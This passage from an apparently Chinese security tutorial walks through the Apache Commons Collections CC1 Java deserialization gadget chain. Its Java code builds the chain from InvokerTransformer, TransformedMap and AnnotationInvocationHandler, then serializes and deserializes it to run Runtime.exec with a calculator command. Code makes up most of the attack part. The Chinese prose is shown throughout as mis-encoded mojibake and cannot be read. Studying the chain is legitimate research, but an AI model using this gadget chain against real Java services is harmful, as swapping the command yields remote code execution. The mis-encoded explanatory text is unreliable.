<li><p><code>org.apache.commons.collections.functors</code> â€“Commons Collectionsè‡ªå®šä¹‰çš„ä¸€ç»„åŠŸèƒ½ç±»</p>
</li>
<li><p><code>org.apache.commons.collections.iterators</code> â€“ å®ç°java.util.Iteratoræ¥å£çš„ä¸€ç»„ç±»</p>
</li>
<li><p><code>org.apache.commons.collections.keyvalue</code> â€“ å®ç°é›†åˆå’Œé”®&#x2F;å€¼æ˜ å°„ç›¸å…³çš„ä¸€ç»„ç±»</p>
</li>
<li><p><code>org.apache.commons.collections.list</code> â€“ å®ç°java.util.Listæ¥å£çš„ä¸€ç»„ç±»</p>
</li>
<li><p><code>org.apache.commons.collections.map</code> â€“ å®ç°Mapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</p>
</li>
<li><p><code>org.apache.commons.collections.set</code> â€“ å®ç°Setç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</p>
</li>
</ul>
<h2 id="æ”»å‡»é“¾åˆ†æ"><a href="#æ”»å‡»é“¾åˆ†æ" class="headerlink" title="æ”»å‡»é“¾åˆ†æ"></a>æ”»å‡»é“¾åˆ†æ</h2><h3 id="å¯»æ‰¾å°¾éƒ¨"><a href="#å¯»æ‰¾å°¾éƒ¨" class="headerlink" title="å¯»æ‰¾å°¾éƒ¨"></a>å¯»æ‰¾å°¾éƒ¨</h3><p>é€šè¿‡<a href="https://github.com/frohoff/ysoserial">ysoserial</a>å¯ä»¥çœ‹åˆ°å±é™©æ–¹æ³•æ˜¯<code>InvokerTransformer . transform()</code>æ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521163436805.png" alt="image-20240521163436805"></p>
<p>æˆ‘ä»¬è¯•ç€ç”¨æ¼æ´å‘ç°ä½œè€…çš„è§†è§’æ¥è°ƒè¯•ä»£ç ï¼Œä½œè€…é¦–å…ˆæ‰¾åˆ°äº†<code>Transformer</code>æ¥å£ï¼Œæ¥å£æœ‰<code>transform()</code>æ–¹æ³•ã€‚</p>
<p>æœ‰21ä¸ªå®ç°æ–¹æ³•(åŒ…å«äº†ä¸»è§’å„¿<code>InvokerTransformer</code>)ï¼Œæ‰¾åˆ°çš„<code>InvokerTransformer.transform()</code>æ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521222016548.png" alt="image-20240521222016548"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521223049332.png" alt="image-20240521223049332"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;  <span class="hljs-comment">//æ¥å—ä¸€ä¸ªå¯¹è±¡</span><br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();  <span class="hljs-comment">//åå°„</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);  <br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);     <span class="hljs-comment">//æ–¹æ³•ï¼Œå‚æ•°ç±»å‹ï¼Œå‚æ•°ï¼Œéƒ½å¯æ§</span><br>                <br>        &#125;<br>    <br></code></pre></td></tr></table></figure>

<p>è¿™å°±å¯ä»¥ä½œä¸ºæˆ‘ä»¬è¿™æ¡é“¾çš„å°¾éƒ¨ã€‚</p>
<p>å°è¯•ç”¨è¿™ä¸ªæ–¹æ³•å»å¼¹è®¡ç®—å™¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-comment">//æ™®é€šå¼¹è®¡ç®—å™¨å†™æ³•</span><br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    <br>    <br>    <span class="hljs-comment">//åå°„å†™æ³•</span><br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    Class&lt;Runtime&gt; c = Runtime.class;<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>    exec.invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br>    <br>    <span class="hljs-comment">//InvokerTransformer.transformå†™æ³•</span><br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä¸ºä»€ä¹ˆå†™<code> new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</code></p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬ç¡®è®¤<code>InvokerTransformer.transform()</code>å› ä¸ºå‚æ•°å¯æ§ï¼Œå¯ä»¥è°ƒç”¨ä»»æ„æ–¹æ³•ã€‚<code>transform()</code>éœ€è¦ä¼ å…¥çš„æ˜¯ä¸€ä¸ªå¯¹è±¡,æ‰€ä»¥ä¼ å…¥å¯¹è±¡Runtimeå¯¹è±¡ï¼›</p>
<p>æ¥ä¸‹æ¥çœ‹InvokerTransformerçš„æ„é€ æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ–¹æ³•åï¼ˆStringç±»å‹ï¼‰ï¼Œæ‰€ä»¥å¡«å…¥â€execâ€ï¼›</p>
<p>ç¬¬äºŒä¸ªå‚æ•°ï¼Œå‚æ•°ç±»å‹ï¼ˆClassæ•°ç»„ï¼‰ï¼Œâ€execâ€æ¥å—ä¸€ä¸ª <code>String</code> ç±»å‹æ‰€ä»¥å¡«å…¥new Class[]{String.class}ï¼›</p>
<p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå‚æ•°å€¼ï¼ˆObjectæ•°ç»„ï¼‰ï¼Œæ‰€ä»¥å¡«å…¥new Object[]{â€œcalcâ€})ï¼›</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521225147161.png" alt="image-20240521225147161"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521225202458.png" alt="image-20240521225202458"></p>
<p>ä¸‹ä¸€æ­¥çš„ç›®æ ‡æ˜¯å»æ‰¾è°ƒç”¨ <code>transform()</code> æ–¹æ³•çš„ä¸åŒç±»ã€‚</p>
<h3 id="å¯»æ‰¾è°ƒç”¨é“¾"><a href="#å¯»æ‰¾è°ƒç”¨é“¾" class="headerlink" title="å¯»æ‰¾è°ƒç”¨é“¾"></a>å¯»æ‰¾è°ƒç”¨é“¾</h3><p>æŒ‰ä½alt+f7å¯»æ‰¾å“ªäº›å‡½æ•°è°ƒç”¨äº†ï¼Œ<code>transform()</code>æ–¹æ³•,çœ‹åˆ°æœ‰21ä¸ªè°ƒç”¨<img src="https://image.sp4rks.xyz/2024/06/image-20240522210518321.png" alt="image-20240522210518321"></p>
<p>æˆ‘ä»¬ç›®æ ‡æ˜¯æ‰¾åˆ°ä¸€ä¸ªä¸åŒåæ–¹æ³•è°ƒç”¨äº†<code>transform()</code>æ–¹æ³•ï¼Œç›¸å½“ä¸è®©è°ƒç”¨é“¾å¾€å‰èµ°ä¸€æ­¥ï¼Œæœ€ç»ˆæˆ‘ä»¬å‘¢æ‰¾åˆ°äº†<code>TransformdMap. checkSetValue()</code>è°ƒç”¨äº†<code>transform()</code><img src="https://image.sp4rks.xyz/2024/06/image-20240522211955793.png" alt="image-20240522211955793"></p>
<p>å•ç‹¬æŠŠè¿™å‡ æ®µä»£ç æ”¾å‡ºæ¥è§£é‡Šä¸€ä¸‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TransformedMapç»§æ‰¿äº†AbstractInputCheckedMapDecorator å¹¶å®ç°äº† Serializable æ¥å£</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span>   <br>        <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractInputCheckedMapDecorator</span><br>        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <br>	<span class="hljs-comment">//keyTransformer å’Œ valueTransformer çš„ç±»å‹æ˜¯Transformerï¼Œè¿™è¡¨æ˜å®ƒä»¬æ˜¯å¯¹è±¡ï¼Œè€Œä¸æ˜¯åŸºæœ¬æ•°æ®ç±»å‹æˆ–å±€éƒ¨å˜é‡ã€‚</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">7023152376788900464L</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer keyTransformer;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer valueTransformer;  <br>    <br><br>	<span class="hljs-comment">//decorate æ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€å·¥å‚æ–¹æ³•ï¼Œæ¥å—ä¸€ä¸ªMapå’Œä¸¤ä¸ªTransformerå¯¹è±¡ï¼Œè¿”å›ä¸€ä¸ªç»è¿‡è½¬æ¢çš„Mapã€‚</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    &#125; <br><br>	<span class="hljs-comment">// æ„é€ å‡½æ•°æ¥å—ä¸€ä¸ªMapå’Œä¸¤ä¸ªTransformerå¯¹è±¡ï¼Œå¹¶è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°super(map)æ¥åˆå§‹åŒ–åŸºç±»éƒ¨åˆ†ï¼ŒåŒæ—¶åˆå§‹åŒ– 	keyTransformer å’Œ valueTransformer æˆå‘˜å˜é‡ã€‚</span><br>  	<span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;   <br>    <br>	<span class="hljs-comment">//checkSetValue æ–¹æ³•ç”¨äºåœ¨è®¾ç½®å€¼æ—¶å¯¹å€¼è¿›è¡Œè½¬æ¢ã€‚å®ƒé€šè¿‡è°ƒç”¨ valueTransformer çš„ transform æ–¹æ³•å°†ä¼ å…¥çš„å€¼è½¬æ¢æˆç›®æ ‡å€¼ã€‚</span><br>	<span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;       <br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">æˆ‘ä»¬çœ‹åˆ°è¿”å›äº†ä¸€ä¸ªvalueTransformer.transform(value),é‚£valueTransformeræ˜¯ä»€ä¹ˆï¼Ÿ(Ctrl+é¼ æ ‡å·¦é”®ç‚¹å‡»valueTransformer)åˆ°äº†æ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°æ˜¯ä¸€ä¸ªprotected,è¯´æ˜åªèƒ½è‡ªå·±è°ƒç”¨<br>    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;<br>        super(map);<br>        this.keyTransformer = keyTransformer;<br>        this.valueTransformer = valueTransformer;<br>    &#125;<br>æœ€åçœ‹åˆ°decorateæ–¹æ³•å®Œæˆäº†è£…é¥°æ“ä½œ<br>      public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;<br>        return new TransformedMap(map, keyTransformer, valueTransformer);<br>    &#125; <br><br></code></pre></td></tr></table></figure>

<p>å› ä¸ºdecorateæ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•æ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨<code>TransformedMap.decorate</code>;</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523095834788.png" alt="image-20240523095834788"></p>
<p>æ¥ä¸‹æ¥å°±æ‰¾è°è°ƒç”¨äº†<code>checkSetValue()</code>,å‘ç°å°±ä¸€ä¸ªè°ƒç”¨ï¼Œ<code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code>ã€‚æ˜¯<code>TransformedMap</code>çš„çˆ¶ç±»ï¼Œå‘ç°å…¶å®<code>AbstractInputCheckedMapDecorator.setValue()</code>æ˜¯é‡å†™äº†Entryéå†çš„å†™æ³•ã€‚é‚£åªè¦æœ‰ä¸€ä¸ªç±»éå†Entryå°±å¯ä»¥èµ°è¿›<code>setValue</code>ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240522222342135.png" alt="image-20240522222342135"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        <br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <br>        <span class="hljs-keyword">for</span> (Map.Entry entry : transformedMap.entrySet()) &#123;<br>            entry.setValue(r);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥è¯•ç€è°ƒè¯•ä¸€äº›è¿™æ®µä»£ç </p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523000545804.png" alt="image-20240523000545804"></p>
<p>é¦–å…ˆè¿›å…¥åˆ°<code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code>ï¼Œparentä¸º<code>TransformedMap</code>å¯¹è±¡ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523090042519.png" alt="image-20240523090042519"></p>
<p>ç„¶åè¿›å…¥åˆ°<code>TransformedMap.checkSetValue</code>;vulueTransformerä¸º<code>InvokerTransformer</code>å¯¹è±¡</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523000632982.png" alt="image-20240523000632982"></p>
<p>ç„¶åè¿›å…¥äº†<code>InvokerTransformer.transform</code>;è°ƒç”¨äº†<code>invoke()</code>æ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523092438757.png" alt="image-20240523092438757"></p>
<p>æ‹æ‹è°ƒç”¨é“¾</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523102559433.png" alt="image-20240523102559433"></p>
<h3 id="é“¾é¦–"><a href="#é“¾é¦–" class="headerlink" title="é“¾é¦–"></a>é“¾é¦–</h3><p>ä¸Šé¢å·²ç»è¯æ˜äº†æˆ‘ä»¬æ‰¾çš„åˆ©ç”¨é“¾æœ‰æ•ˆï¼Œç°åœ¨å†å¾€ä¸Šçº§æ‰¾ï¼Œæ‰¾è°è°ƒç”¨äº†<code>setValue()</code>,æœ€ç»ˆæ‰¾åˆ°äº†<code>AnnotationInvocationHandler.readObject()</code>è°ƒç”¨äº†<code>setValue()</code>ã€‚æ‰€ä»¥å°±å¯ä»¥å½“é“¾é¦–ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523105916973.png" alt="image-20240523105916973"></p>
<h2 id="TransformMapç‰ˆCC1"><a href="#TransformMapç‰ˆCC1" class="headerlink" title="TransformMapç‰ˆCC1"></a>TransformMapç‰ˆCC1</h2><p>è°ƒç”¨é“¾</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523204418229.png" alt="image-20240523204418229"></p>
<p>å› ä¸º<code>AnnotationInvocationHandler</code>ä¸æ˜¯publicæ–¹æ³•ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡åå°„åˆ›å»º</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523104354658.png" alt="image-20240523104354658"></p>
<p>åå°„å†™æ³•æ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523151140450.png" alt="image-20240523151140450"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><br>        <br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br><br>		<br>		<span class="hljs-comment">//åå°„è·å–AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Override.class, transformedMap);<br><br>        SER(o);<br>        UNSER(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="ä¸‰ä¸ªé—®é¢˜"><a href="#ä¸‰ä¸ªé—®é¢˜" class="headerlink" title="ä¸‰ä¸ªé—®é¢˜"></a>ä¸‰ä¸ªé—®é¢˜</h3><ol>
<li><p>Runtimeå¹¶ä¸èƒ½åºåˆ—åŒ–</p>
</li>
<li><p>è¿™ä¸ªå¾ªç¯ä½“ä¸çŸ¥é“æ˜¯å¦èƒ½è¿›å»</p>
</li>
<li><p><code>AnnotationInvocationHandler.readObject() </code>forå¾ªç¯ä¸­æ˜¯<code>new AnnotationTypeMismatchExceptionProxy</code>å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„Runtimeç±»</p>
</li>
</ol>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523152522150.png" alt="image-20240523152522150"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523151954472.png" alt="image-20240523151954472"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523151920747.png" alt="image-20240523151920747"></p>
<h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>è§£å†³é—®é¢˜ä¸€ï¼šè™½ç„¶Runtimeä¸å¯ä»¥åºåˆ—åŒ–ï¼Œä½†æ˜¯Runtime.classå¯ä»¥</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//é€šè¿‡åå°„è·å–Runtimeå¯¹è±¡</span><br>Class&lt;Runtime&gt; c = Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        execMethod.invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">     <span class="hljs-comment">//æ ¹æ®InvokerTransformer().transform()ç¼–å†™ï¼Œç›¸å½“äºç”¨è¿™ä¸€ä¸²ä»£ç ï¼Œå®ç°ä¸Šé¢çš„ä»£ç </span><br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br><br>      <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);<br><br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><br></code></pre></td></tr></table></figure>

<p>è§£å†³é—®é¢˜äºŒï¼š</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523192532159.png" alt="image-20240523192532159"> </p>
<p>åˆ†æä¸€ä¸‹è¿™æ®µä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);  <span class="hljs-comment">//è¿™é‡Œçš„typeå°±æ˜¯æˆ‘ä»¬åˆšåˆšä¼ å…¥çš„Override.class</span><br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();     <span class="hljs-comment">//è·å–æˆå‘˜æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è·å–Overrideçš„æˆå‘˜æ–¹æ³•</span><br>            Class&lt;?&gt; memberType = memberTypes.get(name); <span class="hljs-comment">//æŸ¥æ‰¾æˆå‘˜æ–¹æ³•</span><br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  	<span class="hljs-comment">//ä½†æ˜¯Overrideå¹¶æ²¡æœ‰å€¼ï¼Œæ‰€ä»¥æ ¹æœ¬èµ°ä¸åˆ°ä¸‹é¢çš„åˆ¤æ–­ï¼Œä¹Ÿå°±è°ƒç”¨ä¸äº†setValue()</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>


<p>æ”¹å†™è‡ªå·±çš„ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-comment">//        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);</span><br><span class="hljs-comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="hljs-comment">//è¿™æ®µçš„ä»£ç 